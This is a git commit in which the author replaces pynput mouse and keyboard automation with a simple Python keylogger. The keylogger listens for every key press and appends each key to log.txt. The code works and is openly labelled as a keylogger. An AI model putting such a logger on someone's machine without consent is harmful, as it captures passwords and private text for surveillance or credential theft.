f25c60c50d7ce333bb40220b2bd94be3d656286f
OkoyeEmmanuel <okoye.tochukwu.emmanuel@gmail.com>
2025-09-12 00:28:38 +0200

    update keylogger.py
    it is all coming together, making use of the function in such  a way that when I type something it calls the writetofile function and that function records the key entered and saves it in the log.txt file

--- keylogger.py
+++ keylogger.py
@@ -1,25 +1,11 @@
-from pynput.mouse import Controller as MouseController, Button
-from pynput.keyboard import Controller as KeyboardController, Key
+from pynput.keyboard import Listener
+
+def writetofile(key):
+    keydata = str(key)
+    with open("log.txt", "a") as f:
+        f.write( keydata  + "\n")
 
 
-def controlMouse():
-    mouse = MouseController()
-    mouse.position = (860, 20)
-    mouse.click(Button.left, 2)
-    print(f"Mouse moved to: {mouse.position}")
+with Listener(on_press=writetofile) as l:
+    l.join()
 
-def controlKeyboard():
-    keyboard = KeyboardController()
-    keyboard.press(Key.backspace)
-    keyboard.release(Key.backspace)
-    keyboard.type('www.google.com') 
-
-
-def enter():
-    keyboard = KeyboardController()
-    keyboard.press(Key.enter)
-    keyboard.release(Key.enter)
-
-controlMouse()
-controlKeyboard()
-enter()
